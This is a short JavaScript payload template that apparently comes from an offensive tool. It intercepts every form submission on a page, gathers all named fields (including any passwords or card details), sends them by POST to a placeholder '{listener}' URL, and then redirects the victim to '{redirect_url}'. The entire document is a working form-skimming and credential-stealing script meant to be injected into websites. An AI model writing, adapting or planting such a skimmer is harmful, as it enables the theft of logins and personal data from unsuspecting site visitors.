document.addEventListener('submit', function(event) {
    {
        event.preventDefault();

        var formElements = event.target.elements;
        var formData = new FormData();

        for (var i = 0; i < formElements.length; i++) {
            {
                var element = formElements[i];
                if (element.name) {
                    {
                        formData.append(element.name, element.value);
                    }
                }
            }
        }

        fetch('{listener}', {
            {
                method: 'POST',
                body: formData
            }
        }).then(function() {
            {
                window.location = '{redirect_url}';
            }
        });

        return false;
    }
});
